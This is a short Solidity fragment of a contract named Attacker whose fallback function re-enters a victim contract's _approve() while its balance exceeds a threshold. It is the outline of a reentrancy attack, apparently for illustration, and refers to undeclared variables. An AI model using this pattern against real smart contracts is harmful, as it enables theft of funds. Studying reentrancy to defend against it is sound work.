contract Attacker {
    fallback() external payable {
       if (address(victim).balance > x) {
           victim._approve();
       } else {
           emit AttackFinished();
       }
    }
}
